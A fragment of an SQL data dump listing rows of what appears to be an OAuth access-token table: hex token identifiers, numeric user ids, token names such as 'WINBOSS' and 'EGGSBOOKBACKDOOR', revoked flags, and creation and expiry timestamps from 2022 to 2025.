('be32c6d089c4678dfccdf8eb657939afa9f5bbd7cbf2197720a6c94ecbeeba058fac49cd7c3ecbe3', '118173', 5, 'WINBOSS', '[]', 0, '2022-11-20 07:55:52', '2022-11-20 07:55:52', '2023-11-20 07:55:52'),
('be66199842d7bff37b7ecec46d652a7b52e3aaab84c2f22282799cb8bb4c0fdd28dc40c6dc283acd', '636384', 5, 'WINBOSS', '[]', 0, '2022-06-28 11:53:47', '2022-06-28 11:53:47', '2023-06-28 11:53:47'),
('be694d8c9694ff42cecb49829ebf99a589951b79620bb8bc347f54ff599210baf451f165bb1105cd', '484687', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-12-08 10:13:22', '2022-12-08 10:13:22', '2023-12-08 10:13:22'),
('beb51ad694786e27663f703396ef607d74a1b004721a43d31c3ef7cf0dac524b6fc56c77c6708fb0', '195252', 5, 'WINBOSS', '[]', 0, '2022-12-17 10:36:12', '2022-12-17 10:36:12', '2023-12-17 10:36:12'),
('bec0cc0411162c035be10811d0ece1914ab65e049aff568f6fa42aca10f61f237e0882c1bca3aa29', '846157', 5, 'WINBOSS', '[]', 0, '2023-11-10 06:34:13', '2023-11-10 06:34:13', '2024-11-10 06:34:13'),
('bf34e953e4f44df7e00ceee78338c9659da5e1504985e3a2c0d9156a46d23f25bede490fdcabc3a1', '535146', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-30 02:35:38', '2022-11-30 02:35:38', '2023-11-30 02:35:38'),
('bf817a975ed8dc405c488dd7387ff44d4b25369f8095eca45665e935f2067c1d8489996bb2787878', '977946', 5, 'BeTNoW', '[]', 0, '2022-12-13 07:22:15', '2022-12-13 07:22:15', '2023-12-13 07:22:15'),
('bf8fd8616ee67af452452998955d0fe18c825ac5736bbea0cf5a8dc29705528295a9fc3e906c5177', '860356', 5, 'WINBOSS', '[]', 0, '2022-12-30 09:31:50', '2022-12-30 09:31:50', '2023-12-30 09:31:50'),
('bfbb3a6e534ade04fb49f640678f25c307b5db08d798e597329c4d12a9ce4b36103c2d5d9f1179de', '901159', 5, 'WINBOSS', '[]', 0, '2022-10-24 03:28:24', '2022-10-24 03:28:24', '2023-10-24 03:28:24'),
('bfbf13bfd81f173a9658e113dbfa0624a2c6ca27a19022998f54e8854bced859b4bbc444176cf1b8', '183509', 5, 'WINBOSS', '[]', 0, '2024-01-03 03:09:37', '2024-01-03 03:09:37', '2025-01-03 03:09:37'),
('bfe167a2cbe58b0f79e726e541ed82ab4e470bd3e31c40f4b61630dd7a8076d982b6735558e91bf8', '368320', 5, 'WINBOSS', '[]', 0, '2023-04-18 10:34:29', '2023-04-18 10:34:29', '2024-04-18 10:34:29'),
('bfe746d7e7e4769ee842fc6ae9124314b0d5c0c387e020483c34c4cae6e0ce59170608325a0a8b58', '616326', 5, 'WINBOSS', '[]', 0, '2022-07-04 04:10:02', '2022-07-04 04:10:02', '2023-07-04 04:10:02'),
('c000d181448937c6af8c6e959f313e150c1e29b293c971d31d2f2f0d50717bbf4af3600a49eb58c4', '691612', 5, 'WINBOSS', '[]', 0, '2023-10-10 03:59:44', '2023-10-10 03:59:44', '2024-10-10 03:59:44'),
('c011c61e1011671dd4d06ee3365e15a5e680182ba22141ce3052d957c7ca5ce2359babe7bb2687e5', '900949', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-06-26 07:00:00', '2023-06-26 07:00:00', '2024-06-26 07:00:00'),
('c01a3566b2158ede745491542ba54dd021b0fe0b73c2978caafae0a26fc455afd7b5f49cb72160a6', '139848', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-30 06:16:56', '2023-12-30 06:16:56', '2024-12-30 06:16:56'),
('c023548cca9994eb27a06daca7fe3a3a312e63873de0e52ef731bf067ca772e85715c7ba9aab8553', '658441', 5, 'WINBOSS', '[]', 0, '2022-12-08 07:50:36', '2022-12-08 07:50:36', '2023-12-08 07:50:36'),
('c05ba2070968f2af96f5a77e09ea7a72ff78bd7aefe4d14fb6e297459ed02d0c1066bfeeea374644', '678594', 5, 'WINBOSS', '[]', 0, '2024-01-20 16:31:48', '2024-01-20 16:31:48', '2025-01-20 16:31:48'),
('c0f98f91300fb0644a4623b5f560e4cfacae0bb7008b948ba5bf108e7aa3beed4c4c19d659cc7b60', '804240', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-06-26 05:58:07', '2023-06-26 05:58:07', '2024-06-26 05:58:07'),
('c1495f8d4ef6388e098a8c2900d5361889fb848f95e64917f383e232f6f9094532cfa1160421f806', '250264', 5, 'BeTNoW', '[]', 0, '2022-11-16 07:51:34', '2022-11-16 07:51:34', '2023-11-16 07:51:34'),
('c14af85fbf8bbb3eb5b0ed5a0271795e2edd2b58c09a3f0006b3ce811b2fefba8e23c0404759da16', '201181', 5, 'WINBOSS', '[]', 0, '2023-09-09 10:46:53', '2023-09-09 10:46:53', '2024-09-09 10:46:53'),
('c154dab96b7ba5c92c6250fe0dd7997ae197cdecb19304110f2beb537952a480974e90cb50a881c0', '951969', 5, 'WINBOSS', '[]', 0, '2023-01-17 18:42:48', '2023-01-17 18:42:48', '2024-01-17 18:42:48'),
('c15f91d9a66863df857ac27591196c5974090d05e84b36ee5f2e905ca840c8dd1af9fc8694a1fe01', '287594', 5, 'WINBOSS', '[]', 0, '2022-12-10 12:16:25', '2022-12-10 12:16:25', '2023-12-10 12:16:25'),
('c1f3cabb20d96b0cce1e5fe887afa5d4df63db82ad1df2b2d6920c551ec4a921b592995d683ac5b1', '103004', 5, 'WINBOSS', '[]', 0, '2023-04-19 03:34:38', '2023-04-19 03:34:38', '2024-04-19 03:34:38'),
('c21b735bc6bfb9f11de765071db4774a5270cd0118684b77964d1311bb0e779112fff2ad4243931b', '396833', 5, 'WINBOSS', '[]', 0, '2023-02-15 07:40:45', '2023-02-15 07:40:45', '2024-02-15 07:40:45'),
('c2504cbe0b0b3c85a5901783fd09deab75cfabdf2dd0abd98bdb63020e86fcd690463ee051e6200c', '470900', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:22:31', '2022-06-28 08:22:31', '2023-06-28 08:22:31'),
('c259a6a058934a27f419b1c42e2060e963de2581f2fcbb1904b7d8a40679281a0b7985272bde9cb2', '610499', 5, 'WINBOSS', '[]', 0, '2022-12-27 19:36:05', '2022-12-27 19:36:05', '2023-12-27 19:36:05'),
('c29b45163c90798a4d551ff5f08942ef8f10bc835fd399ac07b92a97dab1af459419cf085e8d2830', '109417', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-06-28 08:17:50', '2022-06-28 08:17:50', '2023-06-28 08:17:50'),
('c2de64eebc499f39a404c2c05c6d90b1044a3d401d7da4f8a5060452f86d32c83020ef2b1617baff', '750763', 5, 'WINBOSS', '[]', 0, '2022-06-28 15:50:44', '2022-06-28 15:50:44', '2023-06-28 15:50:44'),
('c36865cd3ef847b08b834b1d1b1fe0f7ee600dc30aa7a5af2b0be4e3186ec8ebcbb2479cf899ddd5', '749794', 5, 'WINBOSS', '[]', 0, '2022-10-09 22:37:53', '2022-10-09 22:37:53', '2023-10-09 22:37:53'),
('c385f8389052fe73a8c3224772f7eded516b073dca2b3a9fe8d9899f78a215268fd6397ed82c3e2d', '277148', 5, 'WINBOSS', '[]', 0, '2023-07-12 00:55:06', '2023-07-12 00:55:06', '2024-07-12 00:55:06'),
('c3fabd52775b008ece3b3acf3485436d24b347bd78b556a8c8c4075948804d075eaca3ef30388d02', '299962', 5, 'WINBOSS', '[]', 0, '2022-12-25 19:21:34', '2022-12-25 19:21:34', '2023-12-25 19:21:34'),
('c465049bbf933f3ab41342d838c0b63ad9220a6676dd7e42e764c4e6ae40a93cfd0a6c038d775b99', '496389', 5, 'WINBOSS', '[]', 0, '2024-01-20 08:45:42', '2024-01-20 08:45:42', '2025-01-20 08:45:42'),
('c46e4559ef38cb29c56fc0d6b02a7d38d9201f9e2b5667b1ac5484e423922b8114f2216ea49a5bf7', '751210', 5, 'WINBOSS', '[]', 0, '2023-01-12 07:21:37', '2023-01-12 07:21:37', '2024-01-12 07:21:37'),
('c471d1fe3bd5815d1f58c2cfc349ac48eb9ca342eb7bd439dae294392690da428dc05ababdd2318d', '316739', 5, 'WINBOSS', '[]', 0, '2023-06-03 09:13:39', '2023-06-03 09:13:39', '2024-06-03 09:13:39'),
('c4956842f4cf969841bc458ffe084b9014f92f38c252b9d85db79ccb069af8a1ac241efae7da65a6', '784440', 5, 'WINBOSS', '[]', 0, '2023-12-10 05:29:32', '2023-12-10 05:29:32', '2024-12-10 05:29:32'),
('c4d5b7f2d816ece91beb031a59463ee2c0ee04c3256089c3637cb56f573a279bc85006e85d4b4ea2', '566515', 5, 'WINBOSS', '[]', 0, '2022-11-01 03:31:07', '2022-11-01 03:31:07', '2023-11-01 03:31:07'),
('c51db96c72f1727f679a5568df690fce8a7655940823d7ee8a55c15364306efa41524186ff561386', '775741', 5, 'WINBOSS', '[]', 0, '2023-10-13 07:54:44', '2023-10-13 07:54:44', '2024-10-13 07:54:44'),
('c526523fea8fcee173ca85ee582511ed58c0fb2ca149c430408e0e923315145ca1823195d4f9d6e8', '856115', 5, 'WINBOSS', '[]', 0, '2023-04-20 04:21:26', '2023-04-20 04:21:26', '2024-04-20 04:21:26'),
('c527a43948573d3a1f2456e70beb199968b77e8385a1970c187bc3c6a85c34b7eb442a68fdefc317', '160554', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:15:09', '2022-06-28 08:15:09', '2023-06-28 08:15:09'),
('c540357579a9a9e434cb58647fa7613f4bc9a8d35e11485d5d7d8c754514f699445b2a49fc0ebfda', '952316', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:18:30', '2022-09-01 05:18:30', '2023-09-01 05:18:30'),
('c56e2828b422bfdd369679fc24bae24b320a7e030451b8b35377e1af2193a413c48fb70f2606d3ff', '570964', 5, 'WINBOSS', '[]', 0, '2022-08-23 09:50:00', '2022-08-23 09:50:00', '2023-08-23 09:50:00'),
('c58c9f6c93ecb378948d0428696d5baa2c7109f0125fab14970c840541e3df2dc918c82fe09d30b6', '878472', 5, 'WINBOSS', '[]', 0, '2022-12-27 21:16:32', '2022-12-27 21:16:32', '2023-12-27 21:16:32'),
('c58ec52d774b1ac5e7acae1eb64b5240b41ad9c9b484f459d2f8d06e9ba6df3ea91afeb2860395b5', '121748', 5, 'WINBOSS', '[]', 0, '2022-06-29 08:15:49', '2022-06-29 08:15:49', '2023-06-29 08:15:49'),
('c5d331af79f8e559fab810a1dc80366abd6d1019861c73feb5bada966424652425d39dd7ca5da70c', '634928', 5, 'WINBOSS', '[]', 0, '2023-04-17 13:55:23', '2023-04-17 13:55:23', '2024-04-17 13:55:23'),
('c5e4b9809b297a0bcc90c103cbd651b8d51b64f3a25ff7f87a91e79fda06c9917324ec9b950b3cce', '433986', 5, 'WINBOSS', '[]', 0, '2022-12-28 17:56:42', '2022-12-28 17:56:42', '2023-12-28 17:56:42'),
('c5f4c8868dca30586646d40d392d7aeeb1b12b8d571d1e42cddf96de6d637348cc23dab76ecbe2a9', '576142', 5, 'WINBOSS', '[]', 0, '2022-09-03 03:04:52', '2022-09-03 03:04:52', '2023-09-03 03:04:52'),
('c5f7cd212c443acdf2c594af0c054eecd476dc284272d093b1103df3bc150f910e23e97cb58076c6', '209466', 5, 'WINBOSS', '[]', 0, '2023-08-13 12:39:25', '2023-08-13 12:39:25', '2024-08-13 12:39:25'),
('c6284691db95dee6ccbc742f3e945ea530ac2537d9e974f9fee4d5952c2b7ad5d966d4b9bcc2f5eb', '950269', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:16:08', '2022-09-01 05:16:08', '2023-09-01 05:16:08'),
('c632a8bd7b6318e8ed35f5b9ac927ae8157932b27603305cbb43377d9b115479f95d7869a90c6286', '439232', 5, 'WINBOSS', '[]', 0, '2022-12-10 13:25:35', '2022-12-10 13:25:35', '2023-12-10 13:25:35'),
('c65388d516fd7b503100ea15c7a08c323bf281a88774177c74f2bc6d29c185e72496df00f1775aa7', '889860', 5, 'WINBOSS', '[]', 0, '2022-12-25 20:35:23', '2022-12-25 20:35:23', '2023-12-25 20:35:23'),
('c656d8bdc61861a2db6f81ac5f819cecbc2269b3d4419165a988a1155c567e9be2579828980bc435', '894060', 5, 'WINBOSS', '[]', 0, '2023-04-03 15:50:40', '2023-04-03 15:50:40', '2024-04-03 15:50:40'),
('c6c487cb2445bb0fe722930e6979897e1e1b6111998c05696d10bdfb3482e39cceafe2e3da17ce83', '897229', 5, 'WINBOSS', '[]', 0, '2022-11-05 19:51:52', '2022-11-05 19:51:52', '2023-11-05 19:51:52'),
('c6fb69fe5695379fbb77a81802cedc04608142196fb730b2ce12ed1e2d2d7f8211a343015b8eb9ca', '934775', 5, 'WINBOSS', '[]', 0, '2022-12-10 12:20:52', '2022-12-10 12:20:52', '2023-12-10 12:20:52'),
('c71d9a3d52f68acce405c40e84145392ae7de368ab4b10856271b9c9f5c67e608af21c5fc45fe6ee', '659411', 5, 'WINBOSS', '[]', 0, '2023-01-15 04:23:31', '2023-01-15 04:23:31', '2024-01-15 04:23:31'),
('c72a692dcd6160bb64668283f92606c1a77d195759814968f8fec42e57b20e276d49b8a6465e29b0', '144449', 5, 'WINBOSS', '[]', 0, '2023-08-29 17:23:34', '2023-08-29 17:23:34', '2024-08-29 17:23:34'),
('c7ca072c6f6e4af951760cae2260d9f8a8dcd90fc16c793b0e702f319c100009fb27da7787e2b3d6', '983973', 5, 'WINBOSS', '[]', 0, '2023-10-25 10:21:20', '2023-10-25 10:21:20', '2024-10-25 10:21:20'),
('c7e9bd7d76e0004c578c0c6a879754d50991e1e3f7a1c75d260f22499e0a31a0b9c926e4cbb2b7b0', '216294', 5, 'WINBOSS', '[]', 0, '2022-08-23 10:36:21', '2022-08-23 10:36:21', '2023-08-23 10:36:21'),
('c7febd380c9b68aa07c905a811b3ae31f04bcd7fb09dec5000cf894f9e7bddb6202829393bbb0960', '925149', 5, 'WINBOSS', '[]', 0, '2022-12-26 00:09:00', '2022-12-26 00:09:00', '2023-12-26 00:09:00'),
('c81566365d620302c572c6f82b5873d329da4f8caedbb05820ba83341d61e32cc5cb64e84ed30d9e', '395809', 5, 'WINBOSS', '[]', 0, '2022-10-01 04:56:43', '2022-10-01 04:56:43', '2023-10-01 04:56:43'),
('c8240fe2772a3e20d90329b9bdb4207d5ee5abad05412a79df3ab7d8502495a6fe4529f4ad3fbaf9', '276455', 5, 'WINBOSS', '[]', 0, '2022-07-06 08:02:24', '2022-07-06 08:02:24', '2023-07-06 08:02:24'),
('c83385889e92ff5da497585de83b959b28009660688672666112b33c96962f9abf95dc0c794268bd', '242226', 5, 'WINBOSS', '[]', 0, '2023-08-22 05:17:48', '2023-08-22 05:17:48', '2024-08-22 05:17:48'),
('c8567123cc9ccbeae30abf6fdd997bb3647462e747320a1455fdb18b914466b33c8273915100471c', '279002', 5, 'WINBOSS', '[]', 0, '2023-05-29 10:26:33', '2023-05-29 10:26:33', '2024-05-29 10:26:33'),
('c8875aad5d734c0cf90cf4ec1649e2b7fbf2e89f4780e5c0f0d6b4e1de1c0337066917ff475addac', '313054', 5, 'WINBOSS', '[]', 0, '2023-02-20 18:12:03', '2023-02-20 18:12:03', '2024-02-20 18:12:03'),
('c8883926b20f548691aac4a4412125c44f6200f57dc28884f2c0fe98aac5aa1be4f8e70d12b976f1', '784999', 5, 'WINBOSS', '[]', 0, '2022-12-26 13:32:15', '2022-12-26 13:32:15', '2023-12-26 13:32:15'),
('c8973546bec53b65189f08693254eef6679e2aba913bffe9580c4be8498c57bcdd8b863cdd21a619', '693517', 5, 'WINBOSS', '[]', 0, '2023-01-12 03:41:10', '2023-01-12 03:41:10', '2024-01-12 03:41:10'),
('c8a15a0835d649cb4241994b4ef21479b5ebf63622f11736da65b25aa4ebc1efb96907d22af4d3bb', '727996', 5, 'WINBOSS', '[]', 0, '2023-10-01 18:41:30', '2023-10-01 18:41:30', '2024-10-01 18:41:30'),
('c8ab217c207e1f223bcc16ace362792c573fe9bbbcf2a19b6db26c6255567eb84d63294492b9eb22', '782737', 5, 'WINBOSS', '[]', 0, '2023-03-10 08:50:04', '2023-03-10 08:50:04', '2024-03-10 08:50:04'),
('c8ee5635f31fcec3fa7b6f89cce7328081e14f4c1291d7c5f1e1f311f0a80ab0fb005d68aa4c60b5', '334989', 5, 'WINBOSS', '[]', 0, '2022-12-14 08:52:51', '2022-12-14 08:52:51', '2023-12-14 08:52:51'),
('c90861d8d4c7a65aed5aa0095aa90e6cffa3310347246300865abdafb70946f489373e686bfd1b3e', '595300', 5, 'BeTNoW', '[]', 0, '2022-11-12 07:31:06', '2022-11-12 07:31:06', '2023-11-12 07:31:06'),
('c918a301699d3a571cfbabf6faa91b6afaea48a9a75ed7fab818490addacb615157c5b2638cde7f6', '947709', 5, 'WINBOSS', '[]', 0, '2022-12-23 08:32:48', '2022-12-23 08:32:48', '2023-12-23 08:32:48'),
('c91c9df0253b8ca630b196e7332350a60a631edb495420521b2b58ccf31028433ec1517781c75851', '870880', 5, 'WINBOSS', '[]', 0, '2023-05-17 12:07:07', '2023-05-17 12:07:07', '2024-05-17 12:07:07'),
('c92a17ae771e51f453a0f70313e09feddd2ba1264c1c99ea72d8d0864e04d60e28163c77e9e2d6a4', '871817', 5, 'WINBOSS', '[]', 0, '2023-04-14 09:41:09', '2023-04-14 09:41:09', '2024-04-14 09:41:09'),
('c9358751768aa1aa53fe1445ff85e104ce7e9e4db73a11097a68cd2a9577d0fbd37aefd7669e2b79', '213201', 5, 'WINBOSS', '[]', 0, '2023-11-01 10:17:28', '2023-11-01 10:17:28', '2024-11-01 10:17:28'),
('c946670b7594a85a1372ed5014ec5e3c8649d3f603bfb6e3137435ffbd0c49c3842a048d7d3135e4', '130406', 5, 'WINBOSS', '[]', 0, '2022-12-14 08:55:09', '2022-12-14 08:55:09', '2023-12-14 08:55:09'),
('c9515dac6e4323fac04748b72cd5800dec3d9b2bc3280b86a368267211b7bfad05eb0eda77957d03', '229351', 5, 'WINBOSS', '[]', 0, '2023-01-20 16:29:05', '2023-01-20 16:29:05', '2024-01-20 16:29:05'),
('c95c2daf5ed17d25adc15eb08baf2fc27b2a6dc1a36c3c876f27e85556afdb2c4cad414c53926ad2', '124074', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:40:16', '2023-05-31 05:40:16', '2024-05-31 05:40:16'),
('c9aed73b937df31674052697b49b6a6903680e76ea1b55d696302650ae296e57cf05251cc7cbb0e5', '943472', 5, 'WINBOSS', '[]', 0, '2023-09-10 20:23:11', '2023-09-10 20:23:11', '2024-09-10 20:23:11'),
('c9b5d790c275a6ab711eb414a2c4d584622593ae4ad0d953e2064f27122c29e0e12260f723221c32', '274590', 5, 'WINBOSS', '[]', 0, '2022-08-23 10:10:42', '2022-08-23 10:10:42', '2023-08-23 10:10:42'),
('c9fd779279905b15343617574b176fc13d36efbc7ed75974d1475039c603a1d62fd31ec7ad0c0d8f', '167430', 5, 'WINBOSS', '[]', 0, '2022-08-06 02:55:36', '2022-08-06 02:55:36', '2023-08-06 02:55:36'),
('ca102bf25f4be4ad8edf587ab9d1cc0f1890f115acbbf7d2c73878e1d041287917f9c7721337762b', '122572', 5, 'WINBOSS', '[]', 0, '2023-03-31 05:23:03', '2023-03-31 05:23:03', '2024-03-31 05:23:03'),
('ca7d6c7e1e3bb445e85e8e10bb1f309f4abd25feba45f9558a4699b8f0849f17cc8d64201dc777f5', '272958', 5, 'BeTNoW', '[]', 0, '2022-12-25 20:15:31', '2022-12-25 20:15:31', '2023-12-25 20:15:31'),
('caaf713f572d25ec3c43b5eb56c6c6ff7d5fb24da6703f7e01960c0fae99384019c266f39ecec790', '205478', 5, 'WINBOSS', '[]', 0, '2023-07-25 04:17:10', '2023-07-25 04:17:10', '2024-07-25 04:17:10'),
('cad9314deef6abea61d24d521377468f047f707456d62f6ad774c6adf7fdd4991eabebf6b102b2eb', '506957', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:21:38', '2022-06-28 08:21:38', '2023-06-28 08:21:38'),
('caddc6831aa058b32bb3631cf4012eb9d0e5f413d89f84d3422905356f56ea7f848e7a92c1fd1599', '729915', 5, 'WINBOSS', '[]', 0, '2023-07-22 08:33:40', '2023-07-22 08:33:40', '2024-07-22 08:33:40'),
('cb15ac467b3b209ef08b8a92804ed19fd1c1b5237e36e95afd122718fc0e92873441888334625b17', '669406', 5, 'WINBOSS', '[]', 0, '2022-07-08 06:24:35', '2022-07-08 06:24:35', '2023-07-08 06:24:35'),
('cb33a7f991098b32019193acce772b04162851814fbf58916bf6e862755c6b1a3d97a73bb6d82b40', '786192', 5, 'WINBOSS', '[]', 0, '2023-11-05 06:08:09', '2023-11-05 06:08:09', '2024-11-05 06:08:09'),
('cb3a9e5564436865f478158ea53c5803fd88664a0e93bd0ce507c7911802ca595afa1af3026d6e88', '225426', 5, 'WINBOSS', '[]', 0, '2024-01-05 15:18:01', '2024-01-05 15:18:01', '2025-01-05 15:18:01'),
('cb448fae687ea9179585ea135195efc206c376c2894f4a3f2109cfc0b29cb44968db174de5522a08', '989980', 5, 'WINBOSS', '[]', 0, '2023-03-31 16:31:00', '2023-03-31 16:31:00', '2024-03-31 16:31:00'),
('cb6633989047102b7c5368cfb62394178ec6df87e19e4e821466492e133c80724776748de27a1a94', '637243', 5, 'WINBOSS', '[]', 0, '2022-12-11 04:59:44', '2022-12-11 04:59:44', '2023-12-11 04:59:44'),
('cb6c81c7f389bdade969817254bc5e662083f14ddcc88aeeb078460a85acbab5fd69d7c27d42f4a7', '477747', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:46:53', '2023-05-31 05:46:53', '2024-05-31 05:46:53'),
('cbcb54005c5c4344054ac0356698c1d48beffd66af2d3289174d577476b4ab6fa4877c09e47deced', '480972', 5, 'WINBOSS', '[]', 0, '2023-11-05 15:59:09', '2023-11-05 15:59:09', '2024-11-05 15:59:09'),
('cbcfe4ec318919790642f75bb1db1ec8714b74067d0f0d4797cb0c8b0a4371dadc77d3e5da078787', '635862', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-30 06:28:53', '2023-12-30 06:28:53', '2024-12-30 06:28:53'),
('cbeef544e7f15fc1c3c67151049152083d0b1c7cc792dd12330a3f915c3d89bb9343ff1dc34f08d0', '169045', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:13:58', '2022-06-28 08:13:58', '2023-06-28 08:13:58'),
('cc0927ee7d364d370522ddf9dfbd519f58a1766d63b1dc7f17741135d9513a2ee70399dc6053e787', '555357', 5, 'WINBOSS', '[]', 0, '2022-12-17 10:41:34', '2022-12-17 10:41:34', '2023-12-17 10:41:34'),
('cc65f955fe24e8cb8188702a6dd259051508725df5b6be52b9276fb09bbfda4404982a912de7bcd1', '433283', 5, 'WINBOSS', '[]', 0, '2022-08-25 16:02:04', '2022-08-25 16:02:04', '2023-08-25 16:02:04'),
('cc765c99dd9f691967ffcc2a0d47d0f3e375c48ae9f01bb58a48e8734ecfec0c912c6e14fdfcab17', '507606', 5, 'WINBOSS', '[]', 0, '2022-12-17 10:49:55', '2022-12-17 10:49:55', '2023-12-17 10:49:55'),
('cc854e72294ef369c143c5f7d8cc8589050e3bcafb18f706924e94c4c2267edf570c2425b6034c82', '824730', 5, 'WINBOSS', '[]', 0, '2022-10-05 18:42:18', '2022-10-05 18:42:18', '2023-10-05 18:42:18'),
('cca5ec0588c04b11afb6a07865e96eca0f0e81bca4802dd725da73ec587b6ca25139b70f906bd5cb', '561850', 5, 'WINBOSS', '[]', 0, '2023-06-21 08:31:10', '2023-06-21 08:31:10', '2024-06-21 08:31:10'),
('ccc48eda5c9731050ea9459f0c4b178f06e613fffcb893a38b09b10a351c009753bb88b122dd3358', '263632', 5, 'WINBOSS', '[]', 0, '2023-08-10 07:08:19', '2023-08-10 07:08:19', '2024-08-10 07:08:19'),
('ccc54b365770129c09524d6bcdbcd53b9a539017718a24f6ac6156db9cf0381b2580e758da3bbbc0', '690588', 5, 'WINBOSS', '[]', 0, '2023-05-17 09:42:13', '2023-05-17 09:42:13', '2024-05-17 09:42:13'),
('ccceddcc4e64c46cbec646d6e94fe3655f1cb23863c653b79e0997c2fa45abace987f140f13c9b4f', '615742', 5, 'WINBOSS', '[]', 0, '2023-07-20 10:21:11', '2023-07-20 10:21:11', '2024-07-20 10:21:11'),
('ccdef56c05f57bc3f2b895f9c2220494f3cf3497220a84ec1d57e290852e89a533832aca61b75cf8', '858015', 5, 'WINBOSS', '[]', 0, '2023-08-26 06:59:23', '2023-08-26 06:59:23', '2024-08-26 06:59:23'),
('cce30423b3e749465e6e532ea58b910f429643395c49d30cc43b8eb5aefe14c40c3267ffde0616dd', '639829', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-29 04:24:33', '2022-09-29 04:24:33', '2023-09-29 04:24:33'),
('cdc0086744db3b2a47a3c855da6bef483b9e9c538b3b2b13694576b2d202c5013f76f5cf644d4ba9', '646131', 5, 'WINBOSS', '[]', 0, '2023-12-23 08:02:00', '2023-12-23 08:02:00', '2024-12-23 08:02:00'),
('ce146cd8871d60746df376dd76d6b2d57cb818e8ac7b66caaf692a6965fbc2f3ce9f8946b135c618', '662695', 5, 'BeTNoW', '[]', 0, '2022-07-26 07:50:40', '2022-07-26 07:50:40', '2023-07-26 07:50:40'),
('ce155fb97e5b326cd5dd81ccf1d21d216a70f741df79b849298f92e6effdf39a4d5de83ee5ede74e', '696328', 5, 'WINBOSS', '[]', 0, '2023-06-22 13:29:24', '2023-06-22 13:29:24', '2024-06-22 13:29:24'),
('ce27675301cbf7898d7f8d59e98e0f35457e274a131e06e85f4703c0748541aea548a0fb05660d51', '469563', 5, 'WINBOSS', '[]', 0, '2023-03-06 14:07:41', '2023-03-06 14:07:41', '2024-03-06 14:07:41'),
('ce3562b7b8dc2c5cbb1750d61a516ad001d6ce93d6ac124677073b5aa7c85ca9458a414cdddebcae', '392065', 5, 'WINBOSS', '[]', 0, '2022-11-30 03:31:00', '2022-11-30 03:31:00', '2023-11-30 03:31:00'),
('ce45e33194af4a67269af28ce79e2b3f872c434ce8b0607467f36ee8a3cbb435e114f54ddefadaee', '346058', 5, 'WINBOSS', '[]', 0, '2022-12-26 18:34:20', '2022-12-26 18:34:20', '2023-12-26 18:34:20'),
('ce4cd50ef4b32ae164d992bffaacdbd9a2d8e903940c9a655a4fb69fbca35752a64210ae794a0700', '449538', 5, 'WINBOSS', '[]', 0, '2023-02-03 15:14:48', '2023-02-03 15:14:48', '2024-02-03 15:14:48'),
('ce7803675905bb307c0ecef0aa9ec35265cd39ddb019c03820898830e2e3f9f7004247379d84ccbb', '438161', 5, 'WINBOSS', '[]', 0, '2022-12-25 23:02:25', '2022-12-25 23:02:25', '2023-12-25 23:02:25'),
('ce81ca6ca9d843fa234e0fd5fabb0b78de939f311ace20ef9f531e50fbc1d01e8fe86aa61bde3bd7', '393064', 5, 'WINBOSS', '[]', 0, '2022-12-08 13:04:09', '2022-12-08 13:04:09', '2023-12-08 13:04:09'),
('cf3d26127a3bd3b20a7f6426a86ca695ffef9353a824f61fe3ecbc139e76fae257e5f0c248a39b8e', '134058', 5, 'WINBOSS', '[]', 0, '2022-12-20 07:19:55', '2022-12-20 07:19:55', '2023-12-20 07:19:55'),
('cf47fe713442a9f48d6da6dceff133d86b05ee697afcabeeda5152466ca880ab5872c17b354846d3', '742145', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:23:02', '2022-06-28 08:23:02', '2023-06-28 08:23:02'),
('cf83acf3a9843de85fcf56b26681b0411efe498aaa56091dc74a656c5095046dac5f54a1490181ca', '401427', 5, 'WINBOSS', '[]', 0, '2023-03-24 14:39:59', '2023-03-24 14:39:59', '2024-03-24 14:39:59'),
('cf83b0ff495eaf61dd8882746008efba16b74969118463b2e15fdbdd5a654fb2b3ed93d38abb9181', '975472', 5, 'WINBOSS', '[]', 0, '2023-11-08 08:47:06', '2023-11-08 08:47:06', '2024-11-08 08:47:06'),
('cf8454f74ff0e639230ab23786f83ae095b59e7cf2c7a184a8161917901c4c77eb81a8aec507df1c', '325019', 5, 'WINBOSS', '[]', 0, '2022-10-03 12:58:41', '2022-10-03 12:58:41', '2023-10-03 12:58:41'),
('cf907d9f77233debed447604b04eb8add055a9e22c75831c3e69e22fe51a8e1935ba63c0824994ad', '400026', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:26:05', '2022-06-28 08:26:05', '2023-06-28 08:26:05'),
('cf980253ee199e251d8249f4b5e9cf70b8843f5425e56577b0efc7be9d2b6b2ef9cd97cfe7b2f4b6', '225396', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:21:37', '2022-12-07 14:21:37', '2023-12-07 14:21:37'),
('cf9d65345e16191fe84421d1d5a49c59f94f0e5106156db1fc7db8eb384c833672e51bb23fabb0aa', '877590', 5, 'WINBOSS', '[]', 0, '2023-09-11 13:16:28', '2023-09-11 13:16:28', '2024-09-11 13:16:28'),
('cfd08e731fd0ec1f5af100a07050854b8993938abc19957c502089d23c3e3059b5a2c455f1e26116', '979407', 5, 'WINBOSS', '[]', 0, '2023-06-28 18:30:10', '2023-06-28 18:30:10', '2024-06-28 18:30:10'),
('d03d55c31e5ec4c3e8f88bde0bf96b3518c088fbc538a69da6d11fd667164e987e68c1e41eac1d16', '915032', 5, 'WINBOSS', '[]', 0, '2022-12-25 21:05:25', '2022-12-25 21:05:25', '2023-12-25 21:05:25'),
('d072790ac6ac6f1c8eed07151587db1a0f5afeecf0453d47be28cf0374018c2dc7c154cbbf00be51', '464804', 5, 'WINBOSS', '[]', 0, '2022-12-13 07:45:32', '2022-12-13 07:45:32', '2023-12-13 07:45:32'),
